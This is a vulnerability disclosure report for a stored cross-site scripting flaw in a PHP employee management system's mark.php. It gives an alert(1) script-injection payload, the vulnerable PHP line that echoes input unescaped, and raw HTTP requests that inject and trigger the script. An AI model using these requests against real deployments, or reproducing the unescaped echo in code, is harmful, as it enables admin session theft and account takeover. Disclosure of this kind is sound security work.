## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/mark.php` contains a Stored XSS vulnerability

Impact of the vulnerability
An attacker can inject JavaScript into a project record by submitting a crafted value in the “Assign Mark” form. When an administrator later opens the same project marking page, the injected script is rendered into an HTML attribute context and may execute, which can lead to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (performing actions as the admin)
- Phishing/UI manipulation (modifying page content to deceive users)

### Payload:

"><sCrIpT>alert(1)</ScRiPt>

```
"><sCrIpT>alert(1)</ScRiPt>
```

### POC:

The vulnerable endpoint is `POST /mark.php`. The `mark` form field is written to the database and later displayed back into the page without HTML escaping:

- Sink (HTML attribute reflection):

<div class="input-group">

  <p>Assign Mark</p>

​    <input class="input--style-1" type="text"  name="mark" value="<?php echo $mark;?>">

</div>

- Step 1: Inject payload via POST:

POST /mark.php HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

pname=Database&firstName=&duedate=2019-04-07&subdate=2026-04-08&mark=%22%3E%3CsCrIpT%3Ealert%281%29%3C%2FsCrIpT%3E&eid=101&pid=213&points=0&base=55000&bonus=0&total=55000&update=

- Step 2: Trigger execution by revisiting the page:

GET /mark.php?id=101&pid=213 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
After the injection, opening the same marking page renders the stored `mark` value into the input `value` attribute and the browser executes the injected script (e.g., a popup `alert(1)`), confirming stored XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409114314998](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409114314998.png)